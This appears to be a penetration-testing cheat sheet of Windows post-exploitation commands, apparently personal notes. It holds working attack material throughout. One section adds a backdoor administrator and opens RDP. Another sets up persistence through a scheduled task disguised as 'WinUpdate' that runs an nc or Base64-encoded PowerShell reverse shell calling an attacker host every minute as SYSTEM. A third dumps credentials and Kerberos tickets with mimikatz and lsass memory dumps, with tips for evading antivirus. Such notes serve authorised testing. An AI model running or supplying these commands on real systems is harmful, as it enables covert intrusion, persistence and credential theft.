#### Add New Administrator
###### Create New User
`net user admin2 Password123! /add`
###### Add User to Administrators Group
`net localgroup administrators admin2 /add`
###### Add User to Remote Desktop Users
`net localgroup "Remote Desktop Users" admin2 /add`
###### Modify Registry to allow RDP
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
###### Allow RDP on Firewall
`netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes`
###### Force Policy Update
`gpupdate /force`

---
#### Schedule A Reverse Shell
###### Create a scheduled task to trigger a reverse shell with nc
`schtasks /create /tn "WinUpdate" /tr "C:\temp\nc.exe -e cmd.exe <attacker-ip> <port>" /sc minute /mo 1 /ru SYSTEM`
###### Test run task
`schtasks /run /tn "WinUpdate"`
###### Delete scheduled task
`schtasks /delete /tn "WinUpdate" /f`

##### With PowerShell
###### PowerShell Script
```
$TaskName = "WinUpdate"

# Define the PowerShell reverse shell payload
$Payload = '$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# Base64 encode the payload (bypasses command-line detection)
$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

# Create the scheduled task action
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Enc $EncodedPayload"

# Set the trigger to run every minute
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 24)

# Set the task to run as SYSTEM
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

# Task settings (runs on battery, doesn't stop on power issues)
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

# Register the scheduled task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings

```
**Note:** Remove SYSTEM line if you don't want SYSTEM access.
###### Register the Task
`.\reverse-task.ps1`
###### Start the Task Manually
`Start-ScheduledTask -TaskName "WinUpdate"`
###### Stop the Scheduled Task
`Unregister-ScheduledTask -TaskName "WinUpdate" -Confirm:$false`

---
#### Dump Credentials
###### mimikatz credentials dump
`.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
**Note:** Mimikatz can also be found in PowerSploit.ps1 as Invoke-Mimikatz.ps1
[[2.3.4 Lateral Movement#Pass the Hash|Exploitation]]
###### Extract all Kerberos tickets from memory
`.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"`
[[2.3.4 Lateral Movement#Pass the Ticket|Exploitation]]
##### Run in Memory
###### From Network Share
`Invoke-Command -ComputerName <target-ip> -ScriptBlock { \\<attacker-ip>\tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit }`
###### Base64 Encoded
`$b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\temp\tools\mimikatz.exe"))`
**Note:** This Base64 encodes the executable.
`[System.IO.File]::WriteAllBytes("C:\Windows\Temp\m.exe", [Convert]::FromBase64String("<Base64-Encoded-Mimikatz>")) Start-Process "C:\Windows\Temp\m.exe" -ArgumentList "privilege::debug sekurlsa::logonpasswords exit"`
###### procdump.exe
`procdump.exe -accepteula -ma lsass.exe lsass.dmp`
**Note:** Now use mimikatz on a separate machine to avoid AV issues.
###### rundll32.exe
`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump lsass.exe C:\Windows\Temp\lsass.dmp full`
**Note:** Now use mimikatz on a separate machine to avoid AV issues.
###### mimikatz to interrogate lsass.dmp
`sekurlsa::minidump C:\path\to\lsass.dmp`
`sekurlsa::logonpasswords`

